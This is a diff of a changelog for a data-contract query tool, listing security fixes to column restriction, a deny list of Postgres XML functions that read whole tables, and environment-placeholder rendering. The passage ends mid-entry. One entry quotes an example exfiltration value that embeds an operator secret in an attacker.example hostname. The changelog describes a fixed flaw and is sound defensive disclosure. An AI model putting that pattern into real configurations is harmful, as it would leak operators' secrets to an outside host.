@@ -260,8 +260,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   author may notice: on such an expose an expression can only use columns declared in
   `contract.schema` (an undeclared column is no longer projected), and an expose whose schema
   declares no readable column is refused by `query`. Exposes without restrictions keep the same
-  statement as before, except that every term of the `WHERE` is now parenthesised. `query_sql` takes
-  the engine's quote reading as well.
+  statement as before, except that every term of the `WHERE` is now parenthesised.
 - **`query` applies a row filter to every row an expression can see, and refuses a row filter it
   cannot read.** Each term of the `WHERE` is parenthesised, so a measure, dimension or metric-filter
   expression containing `OR` can no longer widen the `policy.rowFilters` ANDed to it. A
@@ -274,6 +273,24 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   stands for columns, or the table (or `_fluid_allowed`) as a whole-row value. `count(*)`,
   multiplication, `count(DISTINCT col)` and `sum` / `avg` over a sensitive column are unaffected, and
   an expression that names a sensitive column is redacted as before.
+- **`query_sql` reads only the columns the expose allows, too.** On an expose that restricts
+  columns or masks them, every reference to the exposed table in the statement (a join, a
+  self-join, a subquery) becomes a projection of the allowed columns, spliced into the statement
+  in place of the table name, so `SELECT *`, `alias.*`, a whole-row value and `COLUMNS(...)` see
+  only those columns. A table function or a file path as a table (`read_csv(...)`, `FROM 'x.csv'`)
+  is refused on such an expose, and so is a CTE named like the exposed table. A statement the
+  parser cannot read is refused. The `TABLE` keyword is refused on such an expose, and so is any
+  source that is not a plain table, a subquery, `UNNEST` or `VALUES`; on DuckDB the engine's own
+  parser checks the rewritten statement as well. `compile_free_form_sql` now refuses a restricted
+  expose called without the `expose` argument. A column list written as `schema.table.column` no
+  longer resolves: give the table an alias, or write `table.column`. Exposes without restrictions
+  are unchanged.
+- **`query_sql` and the `query` expressions refuse the Postgres functions that return a whole
+  table, schema, database or query result as XML.** `table_to_xml`, `query_to_xml`,
+  `cursor_to_xml`, every `schema_to_xml*` and `database_to_xml*`, and the `*xmlschema` and
+  `*_and_xmlschema` variants of each, are refused in any case, quoted or schema-qualified, on every
+  engine. They take the relation or the statement as text, so a check that follows table and column
+  names does not see what they read. A column that only shares one of those names is unaffected.
 - **`{{ env.* }}` on the acquisition path no longer renders the operator's environment into a host
   the contract chooses.** The dispatcher rendered every placeholder from the operator's
   environment before the runner started, so `uri: https://{{ env.OPERATOR_SECRET }}.attacker.example/catalog`
